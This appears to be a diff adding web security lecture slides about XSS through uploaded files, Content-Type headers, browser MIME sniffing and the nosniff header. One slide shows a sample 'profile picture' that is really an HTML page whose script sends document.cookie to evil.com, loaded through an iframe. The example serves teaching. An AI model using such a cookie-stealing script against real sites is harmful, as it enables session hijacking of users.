@@ -1,0 +1,63 @@
+
+### XSS and user content  {.smaller}
+
+
+* XSS makes hosting <em>user uploaded content</em> really tricky
+* example: allow users to upload profile pictures
+* my ‘‘profile picture’’ is this ‘‘image’’ file: 
+```html
+<!DOCTYPE html>
+<html><body><script>
+var image = new Image();
+image.src = "https://evil.com/?cookie=" + document.cookie;
+</script></body></html>
+
+```
+
+* then I have a webpage with: 
+```html
+<iframe src="https://example.com/get-picture?user=myusername">
+
+```
+
+
+
+### content-types to the rescue?  {.smaller}
+
+
+* HTTP response headers include a <em>Content-Type</em> 
+
+   * \\fbox{<code></code> Content-Type: text/html} --- is HTML
+   * \\fbox{<code></code> Content-Type: image/png} --- is PNG-format image
+   * …
+
+* <em><em>should</em> prevent this problem</em> --- if server sends it 
+
+   * browser should try to display HTML ‘‘profile pic’’ as image, not webpage
+   * … even though iframe expects a webpage
+
+
+
+### content-types and browsers  {.smaller}
+
+
+* a few webservers <em>consistently sent the wrong content-type</em> 
+
+   * example: send everything as <code>text/plain</code>
+
+* browsers sometimes tried to <em>compensate</em>!
+* example: Internet Explorer before version 8: <br> <code>image/png</code> is HTML if it looks like HTML
+* example: many browsers: <br> <code>text/plain</code> is HTML if it looks like HTML
+
+
+### modern content-type inference  {.smaller}
+
+
+* [https://mimesniff.spec.whatwg.org/](https://mimesniff.spec.whatwg.org/) 
+
+   * attempt at standard rules (rather than every browser doing this differently)
+   * also handles explicit missing Content-Type
+
+* <code>X-Content-Type-Options: nosniff</code> essentially disables
+* avoid inferring ‘scriptable’ content-types in ‘upgrade’ from text/plain/etc.
+
